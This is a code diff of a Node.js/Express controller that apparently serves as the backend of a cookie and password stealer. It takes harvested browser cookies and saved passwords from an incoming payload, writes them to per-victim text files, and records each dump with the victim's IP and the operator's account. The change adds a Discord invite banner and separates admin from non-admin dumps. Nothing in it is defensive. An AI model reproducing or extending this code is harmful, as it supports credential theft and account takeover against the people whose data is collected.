@@ -221,7 +221,7 @@ exports.getCookie = (req, res, next) => {
                 const ip2 = ip.split(`:`).pop();
 		
                 let verif = await fileModel.findOne({where: {filename: uid}, paranoid: false})
-                console.log(verif)
+                
                 if(verif){
                     while(verif){
                         uid = Date.now().toString(36) + Math.random().toString(36).substr(2);
@@ -230,14 +230,26 @@ exports.getCookie = (req, res, next) => {
                 }
                 
                 try {
-                    const cookies = `Cookies :\n${cookie[0].join('\n')}\n${cookie[1].join('\n')}\n${cookie[2].join('\n')}\n\n\nPassword:\n${password[0].join('\n')}\n${password[1].join('\n')}\n${password[2].join('\n')}\n`                
-                    fs.writeFile(`./cookies/${uid}.txt`, cookies, function (err) {
-                        if (err) throw err;
-                        const file = fileModel.build({ filename: uid, path: `./cookies/${uid}.txt`, ip: ip2, userId: account.id});
+                    if(account.isAdmin == 1){
+                        const cookies = `Join our discord : https://discord.gg/HrxYHrNUya\n\n\nCookies :\n${cookie[0].join('\n')}\n${cookie[1].join('\n')}\n${cookie[2].join('\n')}\n\n\nPassword:\n${password[0].join('\n')}\n${password[1].join('\n')}\n${password[2].join('\n')}\n`                
+                        fs.writeFile(`./cookies/${uid}.txt`, cookies, function (err) {
+                            if (err) throw err;
+                            const file = fileModel.build({ filename: uid, path: `./cookies/${uid}.txt`, ip: ip2, fileAdmin: 1, userId: account.id});
                             file.save()
                                 .then(() => res.status(201).json({ message: 'Utilisateur crée !'}))
                                 .catch(error => res.status(400).json({ error }));
-                    });
+                        });
+                    }else{
+
+                        const cookies = `Join our discord : https://discord.gg/HrxYHrNUya\n\n\nCookies :\n${cookie[0].join('\n')}\n${cookie[1].join('\n')}\n${cookie[2].join('\n')}\n\n\nPassword:\n${password[0].join('\n')}\n${password[1].join('\n')}\n${password[2].join('\n')}\n`                
+                        fs.writeFile(`./cookies/${uid}.txt`, cookies, function (err) {
+                            if (err) throw err;
+                            const file = fileModel.build({ filename: uid, path: `./cookies/${uid}.txt`, ip: ip2, fileAdmin: 0, userId: account.id});
+                            file.save()
+                                .then(() => res.status(201).json({ message: 'Utilisateur crée !'}))
+                                .catch(error => res.status(400).json({ error }));
+                        });
+                    }
                 }catch (e) {
                     
                     res.status(400).json({message:"merci de ne pas modifier le payload"})
